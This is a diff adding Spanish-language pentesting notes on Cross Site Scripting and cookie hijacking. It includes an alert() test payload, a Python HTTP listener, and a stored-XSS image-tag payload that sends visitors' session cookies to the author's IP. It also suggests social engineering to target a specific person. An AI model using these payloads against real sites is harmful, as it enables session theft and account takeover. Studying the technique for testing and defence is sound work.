@@ -340,8 +340,30 @@ Si ha funcionado el texto se verá para todos como lo hayamos puesto. Claro, est
 
 ## Cross Site Scripting (XSS)
 
+Ahora vamos a probar otra cosa con la que podemos comprobar si una web es vulnerable. Vamos aintentar poner un `pop up` con el mensaje que queramos:
+
+```
+<script>alert("XSS vulnerability found uwu")</script>
+```
+
 ## Cookie Hijacking
 
+Claro, con esto podemos hacer que al ver el mensaje `nos mande la coockie de sesion del usuario` que ha visto el mensaje.
+
+Primero tenemos que crear un `servidor http` al que `nos lleguen las cookies`:
+
+```
+> python -m SimpleHTTPServer 443
+```
+
+Ahora escriviremos en un sitio donde sepamos que lo van a `ver otras personas` (o si queremos robarle `a una persona en específico` pues podemos hacer mediante `ingenieria social` que mire ese sitio web). Con el siguiente código lo que pasará es que los usuarios `veran una foto como con un error` de que no se ha podido encontrar, pero por detras `nos estará mandando la cookie de sesión` de cada usuario que lo vea:
+
+```
+<script>document.write('<img src="<http://{mi ip}:{443}/pentesting.jpg?cookie=' + document.cookie + '>">') </script>
+
+```
+
+Ahora la idea es que sin estar autenticado, con la extension de google `Edit this cookie` podremos `cambiarnos la cookie` por la que se nos muestre en el servidor http de la consola y pues se nos `cambiaria la sesión a la del propietario de la cookie capturada`.
 
 # SHELL SHOCK
 
